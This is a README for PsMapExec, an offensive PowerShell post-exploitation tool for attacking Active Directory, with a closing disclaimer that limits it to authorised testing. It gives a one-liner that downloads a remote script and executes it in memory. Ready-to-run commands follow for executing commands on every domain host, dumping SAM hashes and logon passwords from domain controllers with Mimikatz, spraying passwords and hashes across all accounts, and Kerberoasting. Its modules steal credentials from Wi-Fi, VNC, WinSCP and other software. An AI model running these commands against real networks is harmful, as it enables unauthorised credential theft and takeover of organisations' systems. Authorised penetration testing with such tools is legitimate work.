## What is PsMapExec


<p align="Center">
<img src="https://github.com/The-Viper-One/PsMapExec/assets/68926315/14770c85-b751-4127-8261-2e49ff25a8ad" width="280" height="280">
</p>

A PowerShell tool heavily inspired by the popular tool CrackMapExec / NetExec. PsMapExec aims to bring the function and feel of these tools to PowerShell with its own arsenal of improvements. 

PsMapExec is used as a post-exploitation tool to assess and compromise an Active Directory environment. 

For any feedback or suggestions for additions to PsMapExec please use the discussion forum: 
- https://github.com/The-Viper-One/PsMapExec/discussions

## How do I use it

It is highly recommended to go through the documentation listed below to get the most out of PsMapExec. If you do not feel like reading the documentation then simply go to the Usage section further down this document.
* https://viperone.gitbook.io/pentest-everything/psmapexec
* https://viperone.gitbook.io/pentest-everything/psmapexec/target-acquisition
* https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials
* https://viperone.gitbook.io/pentest-everything/psmapexec/methods
* https://viperone.gitbook.io/pentest-everything/psmapexec/modules


## What methods does it support

Currently supported methods (Protocols)

| Method           | Description                                      |
|------------------|--------------------------------------------------|
| [DCSync](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/dcsync)|DCSync |
| [IPMI](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/ipmi)|Dump IPMI hashes|
| [Kerberoast](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/kerberoast) |Kerberoast accounts|
| [MSSQL](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/mssql)|Check access, run commands|
| RDP             | Check access|
| [SMB](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/command-execution)|Check access, run commands|
| [GenRelayList](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/genrelaylist-smb-signing)|Check SMB signing status|
| [Spray](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/spray)|Spray passwords and hashes|
| [SessionHunter](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/session-hunter)|Check access, run commands|
| VNC         |Check no auth access|
| [WinRM](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/command-execution)|Check access, run commands|
| [WMI](https://viperone.gitbook.io/pentest-everything/psmapexec/methods/command-execution)|Check access, run commands|

### Supported Modules

| Module           | Description                                      |
|------------------|--------------------------------------------------|
| [Amnesiac](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/amnesiac)|Executes Amnesiac C2 payloads|
| [ConsoleHistory](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/consolehistory)|Dumps PowerShell console history|
| [Files](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/files)|Lists files in common directories for each user|
| [FileZilla](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/filezilla)|Dumps Filezilla credentials
| [KerbDump](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/kerbdump)|Dumps Kerberos tickets|
| [eKeys](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/ekeys)|Dumps encryption keys from memory (Mimikatz)|
| [LogonPasswords](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/logonpasswords)|Dumps logon passwords from memory (Mimikatz)|
| [LSA](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/lsa)|Dumps LSA (Mimikatz)|
| [MDF](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/mdf)|Dumps MSSQL database hashes|
| [NTDS](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/ntds) |Executes DCsync on the remote system|
| [Notepad](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/notepad) |Dumps notepad backup files
| [NTLM](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/ntlm) |Grabs a NTLM hash for each user logon session|
| [SAM](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/sam)|Dumps SAM hashes|
| [SCCM](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/sccm) |Dumps local NAA credentials and task sequences|
| [SessionExec](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/SessionExec) |Executes commands under each user logon session|
| [SessionRelay](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/SessionRelay) |Relay NTLM hashes under each user logon session|
| [TGTDeleg](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/TGTDeleg) |Grab a fresh TGT under each user logon session|
| [VNC](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/vnc) | Dumps VNC credentials
| [Wi-Fi](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/wi-fi) | Dumps Wi-Fi credentials
| [WinSCP](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/winscp) | Dumps  WinSCP credentials



  
## Usage
### Load the script directly into memory
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```
### Quick examples
```bash
# Execute WMI commands over all systems in the domain using password authentication
 PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command whoami

# Execute WinRM commands over all systems in the domain using hash authentication
PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command whoami

# Check RDP Access against workstations in the domain and using local authentication
PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
 
# Dump SAM on a single system using SMB and a -ticket for authentication
PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM

# Check SMB Signing on all domain systems
PsMapExec -Targets All -Method GenRelayList

# Dump LogonPasswords on all Domain Controllers over WinRM
PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords

# Use WMI to check current user admin access from systems read from a text file
PsMapExec -Targets C:\temp\Systems.txt -Method WMI

# Spray passwords across all accounts in the domain
PsMapExec -Method Spray -SprayPassword [Password]

# Spray Hashes across all accounts in the domain that have AdminCount=1
PsMapExec -Targets "AdminCount=1" -Method Spray -SprayHash [Hash]

# Spray Hashes across all Domain Admin group users
PsMapExec -Targets "Domain Admins" -Method Spray -SprayHash [Hash]

# Kerberoast 
PsMapExec -Method Kerberoast -ShowOutput

# IPMI
PsMapExec -Targets 192.168.1.0/24 -Method IPMI
```

### Targets Acquisition
Target acquisition through PsMapExec is utilized through ADSI Searcher. As long as you are operating from a domain joined system as a domain user account, no issues should be encountered when acquiring targets.
By default only enabled Active Directory computer accounts are populated into the target list. PsMapExec will set the Domain to the current user domain unless -Domain is specified.
IP address targeting is less preffered than using the built in ldap queries.
```bash
# All workstations, servers and domain controllers within the domain
PsMapExec -Targets All

# All workstations, servers and domain controllers on the specified domain
PsMapExec -Targets All -Domain [Domain]

# Only servers from the domain (exluding DCs)
PsMapExec -Targets Servers

# Only Domain Controllers from the domain
PsMapExec -Targets DCs

# Only workstations from the domain
PsMapExec -Targets Workstations

# Set the target values to a defined computer name
PsMapExec -Targets DC01.Security.local

# Read targets from file
PsMapExec -Targets "C:\Targets.txt"

# Wildcard filtering
PsMapExec -Targets SRV*

# Single IP Address
PsMapExec -Targets 192.168.56.11

# CIDR Range
PsMapExec -Targets 192.168.56.0/24
```
### Authentication Types
When  -Command and -Module are omitted, PsMapExec will simply check the provided or current user credentials against the specified target systems for administrative access over the specified method.
```powershell
# Current user
PsMapExec -Targets All -Method [Method]

# With Password
PsMapExec -Targets All -Method [Method] -Username [Username] -Password [Password]

# With Hash
PsMapExec -Targets All -Method [Method] -Username [Username] -Hash [RC4/AES256/NTLM]

# With Ticket
PsMapExec -Targets All -Method [Method] -Ticket [doI.. OR Path to ticket file]

# Local Authentication (WMI only)
PsMapExec -Targets All -Method WMI -LocalAuth
```
### Command Execution
All currently supported command execution methods support the -Command  parameter. The command parameter can be appended to the above Authentication Types to execute given commands as a specified or  the current user.
```powershell
PsMapExec -Targets All -Method [Method] -Command [Command]
```

### Module Execution
All currently supported command execution methods support the -Module  parameter. The module parameter can be appended to the Authentication Types to execute given modules as a specified or the current user. 
```powershell
PsMapExec -Targets All -Method [Method] -Module [Module]
```
A list of modules is linked below in the Detailed Usage section.

## Detailed Usage
* https://viperone.gitbook.io/pentest-everything/psmapexec
* https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials
* https://viperone.gitbook.io/pentest-everything/psmapexec/methods
* https://viperone.gitbook.io/pentest-everything/psmapexec/modules
* https://viperone.gitbook.io/pentest-everything/psmapexec/spray


## Acknowledgements
* https://github.com/Leo4j (A good friend and excellent pentester who has helped me with the code)
* https://github.com/GhostPack/Rubeus
* https://github.com/gentilkiwi/mimikatz
* https://github.com/OneScripter/WmiExec
* https://github.com/MzHmO/PowershellKerberos
* https://github.com/Kevin-Robertson/Inveigh
* https://github.com/Mayyhem/SharpSCCM
* https://github.com/tmenochet
* https://github.com/elnerd/Get-NetNTLM
* https://github.com/danielbohannon/Invoke-Obfuscation

## Dependencies
Since version 0.6.0 PsMapExec now no longer has any external script dependencies apart from the Amnesiac module which will be resolved in a future update.
PsMapExec can now, otherwise be run in restricted environments such as exam labs or CTF machines.


# Disclaimer
PsMapExec is designed primarily for research, educational, and authorized testing scenarios. The purpose of developing and distributing PsMapExec is to provide professionals and researchers with a tool to understand and identify vulnerabilities and to bolster the security of systems. It is fundamentally imperative that users ensure they have obtained explicit, mutual consent from all involved parties before applying this tool on any system, network, or digital environment.

Engaging in unauthorized activities, including, but not limited to, accessing systems without permission, can lead to severe legal consequences. Users must be fully aware of, and adhere to, all their jurisdictional, local, state, and federal laws and regulations concerning cybersecurity and digital access.

The developers and contributors of PsMapExec expressly disclaim all liabilities and responsibilities for any unauthorized or illicit use of the tool. Additionally, they are not responsible for any consequent damages, losses, or repercussions stemming from the misuse or misapplication of PsMapExec.

